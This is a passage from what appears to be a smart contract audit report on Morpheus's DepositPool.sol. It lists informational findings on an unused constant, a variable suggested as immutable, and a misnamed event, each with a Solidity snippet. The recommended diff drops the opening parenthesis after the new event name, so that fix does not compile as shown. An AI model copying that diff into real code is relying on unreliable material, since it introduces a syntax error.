        (uint256 currentPoolRate_, ) = _getCurrentPoolRate(rewardPoolIndex_);

        return _getCurrentUserReward(currentPoolRate_, userData);
    }
```

</details><br>

# Info

## [I-1] Unused Variables
It is best practice to make sure to remove any unused variables to improve code complexity and gas costs. 

Found instances:
- https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/DepositPool.sol#L22
```solidity
// DepositPool.sol
uint128 constant DECIMAL = 1e18;
```

## [I-2] Unchanged Variables Should be Set to Immutable
It it best practice to set unchanged variables to `immutable` to improve code complexity and gas costs.

Found Instances:
- https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/DepositPool.sol#L27
```solidity
// DepositPool.sol
/** @dev Main stake token for the contract */
address public depositToken;
```

## [I-3] Wrong Event Emitted
### Finding description
An event is emitted when the owner sets new details for a reward pool. However, the name of the event is wrong:

<details><summary>Code Snippet</summary>

```solidity
function setRewardPoolProtocolDetails(
        uint256 rewardPoolIndex_,
        uint128 withdrawLockPeriodAfterStake_, 
        uint128 claimLockPeriodAfterStake_,
        uint128 claimLockPeriodAfterClaim_,
        uint256 minimalStake_
    ) public onlyOwner {
        RewardPoolProtocolDetails storage rewardPoolProtocolDetails = rewardPoolsProtocolDetails[rewardPoolIndex_];

        rewardPoolProtocolDetails.withdrawLockPeriodAfterStake = withdrawLockPeriodAfterStake_;
        rewardPoolProtocolDetails.claimLockPeriodAfterStake = claimLockPeriodAfterStake_;
        rewardPoolProtocolDetails.claimLockPeriodAfterClaim = claimLockPeriodAfterClaim_;
        rewardPoolProtocolDetails.minimalStake = minimalStake_;

        emit RewardPoolsDataSet( // @audit-info this is not data it's details
            rewardPoolIndex_,
            withdrawLockPeriodAfterStake_,
            claimLockPeriodAfterStake_,
            claimLockPeriodAfterClaim_,
            minimalStake_
        );
    }
```

</details><br>

The correct name should be `RewardPoolProtocolDetailsSet` as `RewardPoolsData` refers to another mapping entirely with that name.

This could impact users and the owner. It could confuse them about what was actually set. 

## Recommendation
The correct name should be `RewardPoolProtocolDetailsSet` as `RewardPoolsData` refers to another mapping entirely with that name:

<details><summary>diff</summary>

```diff
    function setRewardPoolProtocolDetails(
        uint256 rewardPoolIndex_,
        uint128 withdrawLockPeriodAfterStake_, 
        uint128 claimLockPeriodAfterStake_,
        uint128 claimLockPeriodAfterClaim_,
        uint256 minimalStake_
    ) public onlyOwner {
        RewardPoolProtocolDetails storage rewardPoolProtocolDetails = rewardPoolsProtocolDetails[rewardPoolIndex_];

        rewardPoolProtocolDetails.withdrawLockPeriodAfterStake = withdrawLockPeriodAfterStake_;
        rewardPoolProtocolDetails.claimLockPeriodAfterStake = claimLockPeriodAfterStake_;
        rewardPoolProtocolDetails.claimLockPeriodAfterClaim = claimLockPeriodAfterClaim_;
        rewardPoolProtocolDetails.minimalStake = minimalStake_;

-           emit RewardPoolsDataSet(
+           emit RewardPoolProtocolDetailsSet
            rewardPoolIndex_,
            withdrawLockPeriodAfterStake_,
            claimLockPeriodAfterStake_,
            claimLockPeriodAfterClaim_,
            minimalStake_
        );
    }
```

</details><br>

Also of course make sure that the event is corrected in the `IDepositPool.sol` interface. 